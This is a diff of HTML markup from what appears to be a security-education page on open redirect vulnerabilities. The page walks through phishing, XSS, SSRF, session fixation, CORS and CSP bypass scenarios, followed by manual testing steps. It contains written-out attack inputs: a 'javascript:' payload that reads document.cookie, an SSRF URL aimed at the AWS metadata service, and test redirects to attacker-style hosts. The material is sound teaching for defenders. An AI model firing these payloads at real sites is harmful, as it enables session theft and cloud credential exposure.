-  <a class="anchor" href="#3-phishing-campaign-using-trusted-domain">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">6. Attacker resets victim&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">password</span></span></span></code></pre></div><hr>
+<h3 id="3-phishing-campaign-using-trusted-domain">3. Phishing Campaign Using Trusted Domain<a class="anchor" href="#3-phishing-campaign-using-trusted-domain">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Attacker leverages open redirect on legitimate site to create convincing phishing URLs.</p>
 <p><strong>Attack Flow:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">discovers</span> <span style="color:#a6e22e">open</span> <span style="color:#a6e22e">redirect</span><span style="color:#f92672">:</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">discovers</span> <span style="color:#a6e22e">open</span> <span style="color:#a6e22e">redirect</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-bank.com/redirect?url=ATTACKER_URL
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">creates</span> <span style="color:#a6e22e">phishing</span> <span style="color:#a6e22e">page</span> <span style="color:#a6e22e">mimicking</span> <span style="color:#a6e22e">bank</span> <span style="color:#a6e22e">login</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">sends</span> <span style="color:#a6e22e">phishing</span> <span style="color:#a6e22e">email</span><span style="color:#f92672">:</span>
@@ -1737,76 +1615,60 @@ https://github.com/alex-shpak/hugo-book
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">6. Victim enters credentials thinking it&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">legitimate</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">steals</span> <span style="color:#a6e22e">credentials</span>
-</span></span></code></pre></div><hr>
-<h3 id="4-xss-via-javascript-protocol-redirect">
-  4. XSS via JavaScript Protocol Redirect
-  <a class="anchor" href="#4-xss-via-javascript-protocol-redirect">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">steals</span> <span style="color:#a6e22e">credentials</span></span></span></code></pre></div><hr>
+<h3 id="4-xss-via-javascript-protocol-redirect">4. XSS via JavaScript Protocol Redirect<a class="anchor" href="#4-xss-via-javascript-protocol-redirect">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Open redirect accepts <code>javascript:</code> protocol, leading to XSS execution.</p>
 <p><strong>Attack Flow:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">finds</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">parameter</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">finds</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">parameter</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Injects</span> <span style="color:#a6e22e">JavaScript</span> <span style="color:#a6e22e">protocol</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=javascript:alert(document.cookie)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">Application</span> <span style="color:#a6e22e">sets</span> window.<span style="color:#a6e22e">location</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">input</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">4.</span> <span style="color:#a6e22e">Browser</span> <span style="color:#a6e22e">executes</span> <span style="color:#a6e22e">JavaScript</span> <span style="color:#a6e22e">instead</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">redirecting</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Full</span> <span style="color:#a6e22e">XSS</span> <span style="color:#a6e22e">execution</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">victim</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">browser</span>
-</span></span></code></pre></div><hr>
-<h3 id="5-ssrf-bypass-via-chained-open-redirect">
-  5. SSRF Bypass via Chained Open Redirect
-  <a class="anchor" href="#5-ssrf-bypass-via-chained-open-redirect">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Full</span> <span style="color:#a6e22e">XSS</span> <span style="color:#a6e22e">execution</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">victim</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">browser</span></span></span></code></pre></div><hr>
+<h3 id="5-ssrf-bypass-via-chained-open-redirect">5. SSRF Bypass via Chained Open Redirect<a class="anchor" href="#5-ssrf-bypass-via-chained-open-redirect">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Application blocks requests to internal IPs but allows requests to whitelisted domains with open redirects.</p>
 <p><strong>Attack Flow:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Application</span> <span style="color:#a6e22e">allows</span> <span style="color:#a6e22e">fetching</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">trusted</span><span style="color:#f92672">-</span><span style="color:#a6e22e">partner</span>.<span style="color:#a6e22e">com</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Application</span> <span style="color:#a6e22e">allows</span> <span style="color:#a6e22e">fetching</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">trusted</span><span style="color:#f92672">-</span><span style="color:#a6e22e">partner</span>.<span style="color:#a6e22e">com</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">finds</span> <span style="color:#a6e22e">open</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">trusted</span><span style="color:#f92672">-</span><span style="color:#a6e22e">partner</span>.<span style="color:#a6e22e">com</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-partner.com/go?url=REDIRECT_TARGET
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">chains</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">internal</span> <span style="color:#a6e22e">service</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">content</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">url</span><span style="color:#f92672">=</span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-partner.com/go?url=http://169.254.169.254/latest/meta-data/
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">4.</span> <span style="color:#a6e22e">Application</span> <span style="color:#a6e22e">fetches</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">trusted</span><span style="color:#f92672">-</span><span style="color:#a6e22e">partner</span>.<span style="color:#a6e22e">com</span> (<span style="color:#a6e22e">allowed</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Open</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">forwards</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">AWS</span> <span style="color:#a6e22e">metadata</span> <span style="color:#a6e22e">service</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6.</span> <span style="color:#a6e22e">Internal</span> <span style="color:#a6e22e">data</span> <span style="color:#a6e22e">returned</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">attacker</span>
-</span></span></code></pre></div><hr>
-<h3 id="6-session-fixation-via-open-redirect">
-  6. Session Fixation via Open Redirect
-  <a class="anchor" href="#6-session-fixation-via-open-redirect">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6.</span> <span style="color:#a6e22e">Internal</span> <span style="color:#a6e22e">data</span> <span style="color:#a6e22e">returned</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">attacker</span></span></span></code></pre></div><hr>
+<h3 id="6-session-fixation-via-open-redirect">6. Session Fixation via Open Redirect<a class="anchor" href="#6-session-fixation-via-open-redirect">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Open redirect on login page allows attacker to set session before victim authenticates.</p>
 <p><strong>Attack Flow:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">obtains</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">ID</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">:</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">obtains</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">ID</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">Visit</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#a6e22e">Get</span> <span style="color:#a6e22e">session</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">SESSIONID</span><span style="color:#f92672">=</span><span style="color:#a6e22e">attacker_session_123</span>
+</span></span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">Get</span> <span style="color:#a6e22e">session</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">SESSIONID</span><span style="color:#f92672">=</span><span style="color:#a6e22e">attacker_session_123</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Craft</span> <span style="color:#a6e22e">malicious</span> <span style="color:#a6e22e">login</span> <span style="color:#a6e22e">URL</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">fixed</span> <span style="color:#a6e22e">session</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/login?SESSIONID=attacker_session_123&amp;redirect=https://attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">Victim</span> <span style="color:#a6e22e">clicks</span> <span style="color:#a6e22e">link</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">authenticates</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">4.</span> <span style="color:#a6e22e">Application</span> <span style="color:#a6e22e">doesn</span><span style="color:#e6db74">&#39;t regenerate session after login
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5. Attacker uses attacker_session_123 to access victim&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">account</span>
-</span></span></code></pre></div><hr>
-<h3 id="7-cors-bypass-via-open-redirect">
-  7. CORS Bypass via Open Redirect
-  <a class="anchor" href="#7-cors-bypass-via-open-redirect">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5. Attacker uses attacker_session_123 to access victim&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">account</span></span></span></code></pre></div><hr>
+<h3 id="7-cors-bypass-via-open-redirect">7. CORS Bypass via Open Redirect<a class="anchor" href="#7-cors-bypass-via-open-redirect">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Application has strict CORS policy but trusts specific domains with open redirects.</p>
 <p><strong>Attack Flow:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Application</span> <span style="color:#a6e22e">allows</span> <span style="color:#a6e22e">CORS</span> <span style="color:#a6e22e">requests</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">trusted</span>.<span style="color:#a6e22e">com</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Application</span> <span style="color:#a6e22e">allows</span> <span style="color:#a6e22e">CORS</span> <span style="color:#a6e22e">requests</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">trusted</span>.<span style="color:#a6e22e">com</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">finds</span> <span style="color:#a6e22e">open</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">trusted</span>.<span style="color:#a6e22e">com</span>
 </span></span><span style="display:flex;"><span>
@@ -1819,16 +1681,12 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Response</span> <span style="color:#a6e22e">redirects</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">attacker</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">domain</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6.</span> <span style="color:#a6e22e">Sensitive</span> <span style="color:#a6e22e">data</span> <span style="color:#a6e22e">leaked</span> <span style="color:#a6e22e">cross</span><span style="color:#f92672">-</span><span style="color:#a6e22e">origin</span>
-</span></span></code></pre></div><hr>
-<h3 id="8-csp-bypass-using-whitelisted-open-redirect">
-  8. CSP Bypass Using Whitelisted Open Redirect
-  <a class="anchor" href="#8-csp-bypass-using-whitelisted-open-redirect">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6.</span> <span style="color:#a6e22e">Sensitive</span> <span style="color:#a6e22e">data</span> <span style="color:#a6e22e">leaked</span> <span style="color:#a6e22e">cross</span><span style="color:#f92672">-</span><span style="color:#a6e22e">origin</span></span></span></code></pre></div><hr>
+<h3 id="8-csp-bypass-using-whitelisted-open-redirect">8. CSP Bypass Using Whitelisted Open Redirect<a class="anchor" href="#8-csp-bypass-using-whitelisted-open-redirect">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Content Security Policy whitelists specific domain that contains open redirect.</p>
 <p><strong>Attack Flow:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">CSP</span> <span style="color:#a6e22e">policy</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">script</span><span style="color:#f92672">-</span><span style="color:#a6e22e">src</span> <span style="color:#e6db74">&#39;self&#39;</span> <span style="color:#a6e22e">trusted</span><span style="color:#f92672">-</span><span style="color:#a6e22e">cdn</span>.<span style="color:#a6e22e">com</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">CSP</span> <span style="color:#a6e22e">policy</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">script</span><span style="color:#f92672">-</span><span style="color:#a6e22e">src</span> <span style="color:#e6db74">&#39;self&#39;</span> <span style="color:#a6e22e">trusted</span><span style="color:#f92672">-</span><span style="color:#a6e22e">cdn</span>.<span style="color:#a6e22e">com</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">finds</span> <span style="color:#a6e22e">open</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">on</span> <span style="color:#a6e22e">trusted</span><span style="color:#f92672">-</span><span style="color:#a6e22e">cdn</span>.<span style="color:#a6e22e">com</span>
 </span></span><span style="display:flex;"><span>
@@ -1839,84 +1697,65 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Open</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">serves</span> <span style="color:#a6e22e">attacker</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">JavaScript</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6.</span> <span style="color:#a6e22e">Malicious</span> <span style="color:#a6e22e">script</span> <span style="color:#a6e22e">executes</span> <span style="color:#a6e22e">despite</span> <span style="color:#a6e22e">CSP</span>
-</span></span></code></pre></div><hr>
-<h3 id="9-rate-limit-bypass-via-domain-rotation">
-  9. Rate Limit Bypass via Domain Rotation
-  <a class="anchor" href="#9-rate-limit-bypass-via-domain-rotation">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6.</span> <span style="color:#a6e22e">Malicious</span> <span style="color:#a6e22e">script</span> <span style="color:#a6e22e">executes</span> <span style="color:#a6e22e">despite</span> <span style="color:#a6e22e">CSP</span></span></span></code></pre></div><hr>
+<h3 id="9-rate-limit-bypass-via-domain-rotation">9. Rate Limit Bypass via Domain Rotation<a class="anchor" href="#9-rate-limit-bypass-via-domain-rotation">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Application rate limits based on destination domain but has open redirect.</p>
 <p><strong>Attack Flow:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Application</span> <span style="color:#a6e22e">limits</span> <span style="color:#a6e22e">requests</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">same</span> <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">domain</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Application</span> <span style="color:#a6e22e">limits</span> <span style="color:#a6e22e">requests</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">same</span> <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">domain</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">uses</span> <span style="color:#a6e22e">open</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">appear</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">different</span> <span style="color:#a6e22e">domains</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=https://target1.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=https://target2.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=https://target3.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=https://target2.com
+</span></span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=https://target3.com
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">All</span> <span style="color:#a6e22e">requests</span> <span style="color:#a6e22e">appear</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">go</span> <span style="color:#a6e22e">through</span> <span style="color:#a6e22e">site</span>.<span style="color:#a6e22e">com</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">4.</span> <span style="color:#a6e22e">Rate</span> <span style="color:#a6e22e">limiting</span> <span style="color:#a6e22e">bypassed</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">destination</span> <span style="color:#a6e22e">varies</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">performs</span> <span style="color:#a6e22e">mass</span> <span style="color:#a6e22e">scanning</span><span style="color:#f92672">/</span><span style="color:#a6e22e">enumeration</span>
-</span></span></code></pre></div><hr>
-<h2 id="detection-techniques">
-  Detection Techniques
-  <a class="anchor" href="#detection-techniques">#</a>
-</h2>
-<h3 id="manual-testing-methodology">
-  Manual Testing Methodology
-  <a class="anchor" href="#manual-testing-methodology">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">performs</span> <span style="color:#a6e22e">mass</span> <span style="color:#a6e22e">scanning</span><span style="color:#f92672">/</span><span style="color:#a6e22e">enumeration</span></span></span></code></pre></div><hr>
+<h2 id="detection-techniques">Detection Techniques<a class="anchor" href="#detection-techniques">#</a></h2>
+<h3 id="manual-testing-methodology">Manual Testing Methodology<a class="anchor" href="#manual-testing-methodology">#</a></h3>
 <p><strong>1. Parameter Identification:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Look</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">redirect</span><span style="color:#f92672">-</span><span style="color:#a6e22e">related</span> <span style="color:#a6e22e">parameters</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Look</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">redirect</span><span style="color:#f92672">-</span><span style="color:#a6e22e">related</span> <span style="color:#a6e22e">parameters</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">url</span>, <span style="color:#a6e22e">redirect</span>, <span style="color:#a6e22e">next</span>, <span style="color:#66d9ef">return</span>, <span style="color:#66d9ef">goto</span>, <span style="color:#a6e22e">target</span>, <span style="color:#a6e22e">destination</span>, 
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">redir</span>, <span style="color:#a6e22e">redirect_uri</span>, <span style="color:#66d9ef">continue</span>, <span style="color:#a6e22e">returnUrl</span>, <span style="color:#a6e22e">return_to</span>, 
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">callback</span>, <span style="color:#a6e22e">out</span>, <span style="color:#a6e22e">forward</span>, <span style="color:#a6e22e">link</span>, <span style="color:#a6e22e">go</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">each</span> <span style="color:#a6e22e">parameter</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/page?next=https://evil.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/login?redirect=//attacker.com
-</span></span></span></code></pre></div><p><strong>2. Response Analysis:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Check</span> <span style="color:#a6e22e">HTTP</span> <span style="color:#a6e22e">response</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">redirects</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//target.com/login?redirect=//attacker.com</span></span></span></code></pre></div><p><strong>2. Response Analysis:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Check</span> <span style="color:#a6e22e">HTTP</span> <span style="color:#a6e22e">response</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">redirects</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">I</span> <span style="color:#e6db74">&#34;https://target.com/redirect?url=https://evil.com&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Look</span> <span style="color:#66d9ef">for</span><span style="color:#f92672">:</span>
